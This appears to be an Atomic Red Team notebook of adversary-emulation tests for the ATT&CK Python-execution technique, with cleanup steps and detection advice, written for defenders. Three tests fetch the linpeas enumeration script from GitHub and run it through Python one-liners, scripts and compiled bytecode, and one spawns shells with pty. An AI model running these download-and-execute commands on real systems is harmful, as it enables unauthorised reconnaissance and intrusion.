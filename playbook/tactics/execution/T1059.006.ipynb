{
 "cells": [
  {
   "cell_type": "markdown",
   "id": "0f0a5f36",
   "metadata": {},
   "source": "# T1059.006 - Python\nAdversaries may abuse Python commands and scripts for execution. Python is a very popular scripting/programming language, with capabilities to perform many functions. Python can be executed interactively from the command-line (via the <code>python.exe</code> interpreter) or via scripts (.py) that can be written and distributed to different systems. Python code can also be compiled into binary executables.\n\nPython comes with many built-in packages to interact with the underlying system, such as file operations and device I/O. Adversaries can use these libraries to download and execute commands or other scripts as well as perform various malicious behaviors."
  },
  {
   "cell_type": "markdown",
   "id": "8ac5f55a",
   "metadata": {},
   "source": "## Atomic Tests"
  },
  {
   "cell_type": "markdown",
   "id": "7cca0533",
   "metadata": {},
   "source": "### Atomic Test #1 - Execute shell script via python's command mode arguement\nDownload and execute shell script and write to file then execute locally using Python -c (command mode)\n**Supported Platforms:** linux\n#### Dependencies:  Run with `sh`!\n##### Description: Verify if python is in the environment variable path and attempt to import requests library.\n##### Check Prereq Commands:\n```sh\nwhich_python=$(which python || which python3 || which python3.9 || which python2); $which_python -V\n$which_python -c 'import requests' 2>/dev/null; echo $?\n\n```\n##### Get Prereq Commands:\n```sh\npip install requests\n\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "e6d21302",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1059.006 -TestNumbers 1 -GetPreReqs"
  },
  {
   "cell_type": "markdown",
   "id": "01695df0",
   "metadata": {},
   "source": [
    "#### Attack Commands: Run with `sh`\n",
    "```sh\nwhich_python=$(which python || which python3 || which python3.9 || which python2)\n$which_python -c 'import requests;import os;url = \"https://github.com/carlospolop/PEASS-ng/releases/download/20220214/linpeas.sh\";malicious_command = \"sh T1059.006-payload -q -o SysI, Devs, AvaSof, ProCronSrvcsTmrsSocks, Net, UsrI, SofI, IntFiles\";session = requests.session();source = session.get(url).content;fd = open(\"T1059.006-payload\", \"wb+\");fd.write(source);fd.close();os.system(malicious_command)'\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "368f6b63",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1059.006 -TestNumbers 1"
  },
  {
   "cell_type": "markdown",
   "id": "18ccf40a",
   "metadata": {},
   "source": "#### Cleanup: \n```sh\nrm T1059.006-payload \n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "0529f84d",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1059.006 -TestNumbers 1 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "80bf8a21",
   "metadata": {},
   "source": "### Atomic Test #2 - Execute Python via scripts\nCreate Python file (.py) that downloads and executes shell script via executor arguments\n**Supported Platforms:** linux\n#### Dependencies:  Run with `sh`!\n##### Description: Requires Python\n\n##### Check Prereq Commands:\n```sh\nwhich_python=$(which python || which python3 || which python3.9 || which python2); $which_python -V\n$which_python -c 'import requests' 2>/dev/null; echo $?\n\n```\n##### Get Prereq Commands:\n```sh\npip install requests    \n\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "387f981a",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1059.006 -TestNumbers 2 -GetPreReqs"
  },
  {
   "cell_type": "markdown",
   "id": "6df53b6f",
   "metadata": {},
   "source": [
    "#### Attack Commands: Run with `sh`\n",
    "```sh\nwhich_python=$(which python || which python3 || which python3.9 || which python2)\necho 'import requests' > T1059.006.py\necho 'import os' >> T1059.006.py\necho 'url = \"https://github.com/carlospolop/PEASS-ng/releases/download/20220214/linpeas.sh\"' >> T1059.006.py\necho 'malicious_command = \"sh T1059.006-payload -q -o SysI, Devs, AvaSof, ProCronSrvcsTmrsSocks, Net, UsrI, SofI, IntFiles\"' >> T1059.006.py\necho 'session = requests.session()' >> T1059.006.py\necho 'source = session.get(url).content' >> T1059.006.py\necho 'fd = open(\"T1059.006-payload\", \"wb+\")' >> T1059.006.py\necho 'fd.write(source)' >> T1059.006.py\necho 'fd.close()' >> T1059.006.py\necho 'os.system(malicious_command)' >> T1059.006.py\n$which_python T1059.006.py\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "5a5e7580",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1059.006 -TestNumbers 2"
  },
  {
   "cell_type": "markdown",
   "id": "db2126e0",
   "metadata": {},
   "source": "#### Cleanup: \n```sh\nrm T1059.006.py T1059.006-payload  \n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "ab54d144",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1059.006 -TestNumbers 2 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "c9b88819",
   "metadata": {},
   "source": "### Atomic Test #3 - Execute Python via Python executables\nCreate Python file (.py) then compile to binary (.pyc) that downloads an external malicious script then executes locally using the supplied executor and arguments\n\n**Supported Platforms:** linux\n#### Dependencies:  Run with `sh`!\n##### Description: Requires Python\n\n##### Check Prereq Commands:\n```sh\nwhich_python=$(which python || which python3 || which python3.9 || which python2); $which_python -V\n$which_python -c 'import requests' 2>/dev/null; echo $?\n\n```\n##### Get Prereq Commands:\n```sh\npip install requests    \n\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "938c0a9c",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1059.006 -TestNumbers 3 -GetPreReqs"
  },
  {
   "cell_type": "markdown",
   "id": "a5b0c58e",
   "metadata": {},
   "source": [
    "#### Attack Commands: Run with `sh`\n",
    "```sh\nwhich_python=$(which python || which python3 || which python3.9 || which python2)\necho 'import requests' > T1059.006.py\necho 'import os' >> T1059.006.py\necho 'url = \"https://github.com/carlospolop/PEASS-ng/releases/download/20220214/linpeas.sh\"' >> T1059.006.py\necho 'malicious_command = \"sh T1059.006-payload -q -o SysI, Devs, AvaSof, ProCronSrvcsTmrsSocks, Net, UsrI, SofI, IntFiles\"' >> T1059.006.py\necho 'session = requests.session()' >> T1059.006.py\necho 'source = session.get(url).content' >> T1059.006.py\necho 'fd = open(\"T1059.006-payload\", \"wb+\")' >> T1059.006.py\necho 'fd.write(source)' >> T1059.006.py\necho 'fd.close()' >> T1059.006.py\necho 'os.system(malicious_command)' >> T1059.006.py\n$which_python -c 'import py_compile; py_compile.compile(\"T1059.006.py\", \"T1059.006.pyc\")'\n$which_python T1059.006.pyc\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "4e14f205",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1059.006 -TestNumbers 3"
  },
  {
   "cell_type": "markdown",
   "id": "45aa7529",
   "metadata": {},
   "source": "#### Cleanup: \n```sh\nrm T1059.006.pyc T1059.006.py T1059.006-payload\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "c7a5e1a0",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1059.006 -TestNumbers 3 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "6cab8058",
   "metadata": {},
   "source": "### Atomic Test #4 - Python pty module and spawn function used to spawn sh or bash\nUses the Python spawn function to spawn a sh shell followed by a bash shell. Per Volexity, this technique was observed in exploitation of Atlassian Confluence [CVE-2022-26134]. Reference: https://www.volexity.com/blog/2022/06/02/zero-day-exploitation-of-atlassian-confluence\n\n**Supported Platforms:** linux\n#### Dependencies:  Run with `sh`!\n##### Description: Verify if python is in the environment variable path and attempt to import requests library.\n\n##### Check Prereq Commands:\n```sh\nwhich_python=$(which python || which python3 || which python3.9 || which python2); $which_python -V\n$which_python -c 'import requests' 2>/dev/null; echo $?          \n\n```\n##### Get Prereq Commands:\n```sh\npip install requests\n\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "022e4057",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1059.006 -TestNumbers 4 -GetPreReqs"
  },
  {
   "cell_type": "markdown",
   "id": "81cc0b1d",
   "metadata": {},
   "source": [
    "#### Attack Commands: Run with `sh`\n",
    "```sh\nwhich_python=$(which python || which python3 || which python3.9 || which python2)\n$which_python -c \"import pty;pty.spawn('/bin/sh')\"\nexit\n$which_python -c \"import pty;pty.spawn('/bin/bash')\"\nexit```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "39e17d0a",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1059.006 -TestNumbers 4"
  },
  {
   "cell_type": "markdown",
   "id": "b7d34c9e",
   "metadata": {},
   "source": "## Detection\nMonitor systems for abnormal Python usage and python.exe behavior, which could be an indicator of malicious activity. Understanding standard usage patterns is important to avoid a high number of false positives. If scripting is restricted for normal users, then any attempts to enable scripts running on a system would be considered suspicious. If scripts are not commonly used on a system, but enabled, scripts running out of cycle from patching or other administrator functions are suspicious. Scripts should be captured from the file system when possible to determine their actions and intent.\n\nScripts are likely to perform actions with various effects on a system that may generate events, depending on the types of monitoring used. Monitor processes and command-line arguments for script execution and subsequent behavior. Actions may be related to network and system information Discovery, Collection, or other scriptable post-compromise behaviors and could be used as indicators of detection leading back to the source script."
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": ".NET (PowerShell)",
   "language": "pwsh",
   "name": ".net-powershell"
  },
  "language_info": {
   "file_extension": ".ps1",
   "mimetype": "text/x-powershell",
   "name": "pwsh",
   "pygments_lexer": "powershell",
   "version": "7.0"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}